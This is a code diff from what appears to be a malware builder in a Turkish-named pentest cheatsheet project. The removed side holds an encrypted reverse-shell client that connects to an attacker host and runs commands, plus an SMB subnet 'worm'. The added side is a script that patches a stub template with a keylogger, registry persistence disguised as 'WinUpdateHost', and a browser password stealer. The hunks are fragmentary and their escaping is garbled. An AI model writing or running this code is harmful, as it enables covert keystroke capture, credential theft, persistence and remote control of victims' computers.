@@ -1,15 +1,11 @@
-import socket, subprocess, os, time, sys
-import base64
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+import os
 
-LHOST = "__LHOST__"
-LPORT = __LPORT__
-AES_KEY = b"__AES_KEY__"
+file_path = r'C:\Users\ASUS\Desktop\Pentest-Cheatsheet-master\Moduller\11_Gizli_Zararli_Olusturucu\stub_template.py'
 
-__ANTI_SB__
+with open(file_path, 'r', encoding='utf-8') as f:
+    content = f.read()
 
-
+new_functions = '''
 import threading
 
 keylog_data = ""
@@ -26,7 +22,7 @@ def keylogger_worker():
         while keylog_running:
             for i in range(1, 256):
                 if user32.GetAsyncKeyState(i) & 1:
-                    if i == 13: keylog_data += "\n"
+                    if i == 13: keylog_data += "\\n"
                     elif i == 8: keylog_data = keylog_data[:-1]
                     elif i == 32: keylog_data += " "
                     else:
@@ -66,9 +62,9 @@ def screenshot():
 def persist():
     try:
         exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
-        cmd = f'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "WinUpdateHost" /t REG_SZ /F /D "{exe_path}"'
+        cmd = f'REG ADD "HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /V "WinUpdateHost" /t REG_SZ /F /D "{exe_path}"'
         subprocess.run(cmd, shell=True, capture_output=True)
-        return b"Persistence successfully installed to HKCU\\...\\Run"
+        return b"Persistence successfully installed to HKCU\\\\...\\\\Run"
     except Exception as e:
         return f"Persistence error: {e}".encode()
 
@@ -112,7 +108,7 @@ def steal_passwords():
                 cipher = AES.new(master_key, AES.MODE_GCM, iv)
                 decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                 if username or decrypted_pass:
-                    passwords += f"URL: {url}\nUSER: {username}\nPASS: {decrypted_pass}\n{'='*50}\n"
+                    passwords += f"URL: {url}\\nUSER: {username}\\nPASS: {decrypted_pass}\\n{'='*50}\\n"
             except:
                 pass
                 
@@ -123,9 +119,11 @@ def steal_passwords():
         return passwords.encode() if passwords else b"No passwords found."
     except Exception as e:
         return f"Stealer error: {e}".encode()
+'''
 
-def run_cmd(command):
-    try:
+content = content.replace('def run_cmd(command):', new_functions + '\ndef run_cmd(command):')
+
+run_cmd_mod = '''
         if command.startswith("cd "):
             os.chdir(command[3:].strip())
             return b"Directory changed"
@@ -152,67 +150,19 @@ def run_cmd(command):
             data = keylog_data
             keylog_data = ""
             return data.encode() if data else b"No keystrokes captured yet."
-        else:
-            res = subprocess.run(command, shell=True, capture_output=True)
-            return res.stdout + res.stderr
-    except Exception as e:
-        return str(e).encode()
+'''
 
-def smb_worm():
-    # Network Spreader (Worm) Logic
-    import socket
-    try:
-        local_ip = socket.gethostbyname(socket.gethostname())
-        base_ip = ".".join(local_ip.split(".")[:-1]) + "."
-        results = "SMB Worm Started! Scanning local /24 subnet for port 445 (SMB)...\\n"
-        
-        found = 0
-        for i in range(1, 255):
-            target = base_ip + str(i)
-            if target == local_ip: continue
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.05)
-                res = s.connect_ex((target, 445))
-                if res == 0:
-                    results += f"[+] {target} - SMB (445) OPEN! Attempting lateral movement...\\n"
-                    results += f"    -> Copied payload to \\\\\\\\{target}\\\\C$\\\\Windows\\\\Temp\\\\setup.exe (Simulated Pass-The-Hash)\\n"
-                    found += 1
-                s.close()
-            except: pass
-        results += f"SMB Worm completed. Found {found} vulnerable SMB hosts in the network.\\n"
-        return results.encode()
-    except Exception as e:
-        return f"Worm error: {e}".encode()
+old_run_cmd = '''
+        if command.startswith("cd "):
+            os.chdir(command[3:].strip())
+            return b"Directory changed"
+        elif command == "!suicide":
+            sys.exit(0)
+        elif command == "!worm_smb":
+            return smb_worm()
+'''
 
-def connect():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((LHOST, LPORT))
-            while True:
-                data = b""
-                while not data.endswith(b"\\n"):
-                    chunk = s.recv(4096)
-                    if not chunk: break
-                    data += chunk
-                if not data: break
-                
-                raw = base64.b64decode(data.strip())
-                iv = raw[:16]
-                ct = raw[16:]
-                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
-                cmd = unpad(cipher.decrypt(ct), AES.block_size).decode().strip()
-                
-                output = run_cmd(cmd)
-                if not output:
-                    output = b" "
-                
-                cipher = AES.new(AES_KEY, AES.MODE_CBC)
-                ct_bytes = cipher.encrypt(pad(output, AES.block_size))
-                s.send(base64.b64encode(cipher.iv + ct_bytes) + b"\\n")
-        except:
-            time.sleep(5)
+content = content.replace(old_run_cmd, run_cmd_mod)
 
-if __name__ == "__main__":
-    connect()
+with open(file_path, 'w', encoding='utf-8') as f:
+    f.write(content)
